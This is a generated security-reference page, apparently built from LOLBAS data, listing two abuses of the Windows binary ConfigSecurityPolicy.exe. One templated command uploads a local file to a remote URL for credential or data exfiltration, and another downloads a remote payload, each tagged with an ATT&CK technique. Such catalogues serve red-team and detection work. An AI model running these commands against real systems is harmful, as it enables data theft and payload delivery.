---
parsed_by: focuslocust
source: commands
type: generated
---
# ConfigSecurityPolicy Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ConfigSecurityPolicy.exe

Tool page: [ConfigSecurityPolicy.exe](../../tools/windows/configsecuritypolicy.exe.md)

### Upload file

```text
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
```

Description:

Upload file, credentials or data exfiltration in general

Related ATT&CK:

- [T1567](../../attack/techniques/T1567-exfiltration-over-web-service.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/ConfigSecurityPolicy.yml` |
| Evidence | Command preserved from source parser. |

### Downloads payload from remote server

```text
ConfigSecurityPolicy.exe {REMOTEURL}
```

Description:

It will download a remote payload and place it in INetCache.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/ConfigSecurityPolicy.yml` |
| Evidence | Command preserved from source parser. |
